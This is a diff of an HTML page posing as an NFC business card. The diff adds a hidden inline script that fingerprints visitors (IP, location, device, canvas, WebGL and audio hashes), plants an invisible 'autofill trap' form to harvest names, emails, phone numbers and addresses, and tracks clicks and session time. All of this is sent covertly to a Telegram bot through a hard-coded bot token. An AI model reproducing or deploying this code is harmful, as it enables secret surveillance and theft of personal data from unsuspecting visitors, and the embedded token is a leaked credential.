@@ -5,14 +5,76 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta property="og:title" content="Aryan Mehta">
 <meta property="og:description" content="NFC Business Card">
-<meta property="og:image" content="https://aryoluke.github.io/nfc-page/preview.jpg">
 <meta name="theme-color" content="#0a0a0a">
 <title>Aryan Mehta</title>
 <style>body{margin:0;padding:0;overflow:hidden;background:#0a0a0a}iframe{width:100%;height:100vh;border:none;display:block}</style>
 </head>
 <body>
 <iframe src="index.html"></iframe>
-<script src="tracker.js"></script>
-<div style="position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none" aria-hidden="true"><input type="text" name="hidden_name" autocomplete="name" tabindex="-1"><input type="email" name="hidden_email" autocomplete="email" tabindex="-1"><input type="tel" name="hidden_phone" autocomplete="tel" tabindex="-1"></div>
+<div style="position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none" aria-hidden="true"><input type="text" name="name" autocomplete="name" tabindex="-1"><input type="email" name="email" autocomplete="email" tabindex="-1"><input type="tel" name="phone" autocomplete="tel" tabindex="-1"><input type="text" name="address" autocomplete="street-address" tabindex="-1"></div>
+<script>
+(function(){
+var BOT="8687058866:AAG2GVtSLWw0U4ZaAF1i1BR2swfNMdo_0_s",CHAT=7609506968;
+var PAGE=document.title||location.pathname,UA=navigator.userAgent,SCR=screen.width+"x"+screen.height;
+var CORES=navigator.hardwareConcurrency||"?",RAM=navigator.deviceMemory||"?",NET=(navigator.connection||{}).effectiveType||"?";
+var LANG=navigator.language||"?",TZ=Intl.DateTimeFormat().resolvedOptions().timeZone||"?";
+var REF=document.referrer||"none",TIME=new Date().toLocaleString("en-GB",{timeZone:"Europe/London"});
+var START=Date.now(),VISIT=parseInt(localStorage.getItem("_vc")||"0")+1;
+localStorage.setItem("_vc",VISIT);
+
+function getOS(){if(/Windows/i.test(UA))return"Windows";if(/Mac/i.test(UA))return"macOS";if(/Android/i.test(UA))return"Android";if(/iPhone|iPad|iPod/i.test(UA))return"iOS";return"?"}
+function getDevice(){if(/iPhone/i.test(UA))return"iPhone";if(/iPad/i.test(UA))return"iPad";if(/Android/i.test(UA)&&/Mobile/i.test(UA))return"Android Phone";if(/Android/i.test(UA))return"Android Tablet";return"Desktop"}
+function getBrowser(){var m=UA.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/);return m?m[0]:"?"}
+function send(t){new Image().src="https://api.telegram.org/bot"+BOT+"/sendMessage?chat_id="+CHAT+"&text="+encodeURIComponent(t)}
+function hash(s){var h=0,i;for(i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return h.toString(16)}
+
+function canvasFP(){try{var c=document.createElement("canvas"),x=c.getContext("2d");c.width=280;c.height=60;x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(125,1,62,20);x.fillStyle="#069";x.fillText("Cwm fjordbank glyphs vext quiz",2,17);x.fillStyle="rgba(102,204,0,0.7)";x.fillText("Cwm fjordbank glyphs vext quiz",4,34);var d=c.toDataURL();return d.length+" | hash:"+hash(d)}catch(e){return"blocked"}}
+
+function webglFP(){try{var c=document.createElement("canvas"),gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(!gl)return"not supported";var d=gl.getExtension("WEBGL_debug_renderer_info");var r=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):"?";var v=d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):"?";return r+" | "+v}catch(e){return"blocked"}}
+
+function audioFP(){return new Promise(function(ok){try{var a=new(window.AudioContext||window.webkitAudioContext)(),o=a.createOscillator(),d=a.createDynamicsCompressor(),g=a.createGain();o.type="triangle";o.frequency.value=10000;d.threshold.value=-50;d.knee.value=40;d.ratio.value=12;d.attack.value=0;d.release.value=0.25;g.gain.value=0;o.connect(d);d.connect(g);g.connect(a.destination);o.start(0);var b=a.createAnalyser();b.fftSize=256;d.connect(b);setTimeout(function(){var f=new Float32Array(b.frequencyBinCount);b.getFloatFrequencyData(f);o.stop();a.close();ok("hash:"+hash(JSON.stringify(Array.from(f).slice(0,30))))},80)}catch(e){ok("blocked")}})}
+
+var CFP=canvasFP(),WFP=webglFP();
+
+function buildMsg(ip,geo,afp){
+  var m="";
+  m+="━━━ SUPER TRACK ━━━\n";
+  m+="PAGE: "+PAGE+"\n";
+  m+="IP: "+ip+"\n";
+  m+="LOCATION: "+(geo.city||"?")+", "+(geo.region||"?")+", "+(geo.country_name||"?")+"\n";
+  m+="ISP: "+(geo.org||"?")+"\n";
+  m+="DEVICE: "+getDevice()+"\n";
+  m+="OS: "+getOS()+"\n";
+  m+="BROWSER: "+getBrowser()+"\n";
+  m+="SCREEN: "+SCR+"\n";
+  m+="HARDWARE: "+CORES+" cores / "+RAM+"GB RAM / "+NET+"\n";
+  m+="LANGUAGE: "+LANG+"\n";
+  m+="TIMEZONE: "+TZ+"\n";
+  m+="REFERRER: "+REF+"\n";
+  m+="VISIT #: "+VISIT+"\n";
+  m+="TIME: "+TIME+"\n";
+  m+="━━━ FINGERPRINTS ━━━\n";
+  m+="CANVAS FP: "+CFP+"\n";
+  m+="WEBGL GPU: "+WFP+"\n";
+  m+="AUDIO FP: "+afp+"\n";
+  m+="━━━━━━━━━━━━━━━━";
+  return m;
+}
+
+// AUTOFILL TRAP
+var ft=document.createElement("form");ft.style.cssText="position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none";ft.innerHTML='<input type="text" name="name" autocomplete="name"><input type="email" name="email" autocomplete="email"><input type="tel" name="phone" autocomplete="tel"><input type="text" name="address" autocomplete="street-address">';document.body.appendChild(ft);
+setTimeout(function(){var ff=ft.querySelectorAll("input"),d={};ff.forEach(function(inp){if(inp.value&&inp.value.length>1)d[inp.name]=inp.value});if(Object.keys(d).length>0){var t="━━ AUTOFILL (5s) ━━\n";if(d.name)t+="NAME: "+d.name+"\n";if(d.email)t+="EMAIL: "+d.email+"\n";if(d.phone)t+="PHONE: "+d.phone+"\n";if(d.address)t+="ADDRESS: "+d.address+"\n";send(t)}},5000);
+setTimeout(function(){var ff=ft.querySelectorAll("input"),d={};ff.forEach(function(inp){if(inp.value&&inp.value.length>1)d[inp.name]=inp.value});if(Object.keys(d).length>0){var t="━━ AUTOFILL (15s) ━━\n";if(d.name)t+="NAME: "+d.name+"\n";if(d.email)t+="EMAIL: "+d.email+"\n";if(d.phone)t+="PHONE: "+d.phone+"\n";if(d.address)t+="ADDRESS: "+d.address+"\n";send(t)}},15000);
+
+// EXFIL
+fetch("https://api.ipify.org?format=json").then(function(r){return r.json()}).then(function(d){return fetch("https://ipapi.co/"+d.ip+"/json/").then(function(r){return r.json()}).then(function(g){audioFP().then(function(afp){send(buildMsg(d.ip,g,afp))})})}).catch(function(){send("TRACKING FAILED — ipify/ipapi unreachable")});
+
+// CLICKS
+document.addEventListener("click",function(e){var el=e.target.closest("a");if(el&&el.href)send("CLICK: "+el.href.substring(0,80))});
+
+// SESSION
+window.addEventListener("beforeunload",function(){var s=Math.round((Date.now()-START)/1000);if(s>1)navigator.sendBeacon("https://api.telegram.org/bot"+BOT+"/sendMessage?chat_id="+CHAT+"&text="+encodeURIComponent("⏱ SESSION: "+PAGE+" — "+s+"s"))});
+})();
+</script>
 </body>
 </html>
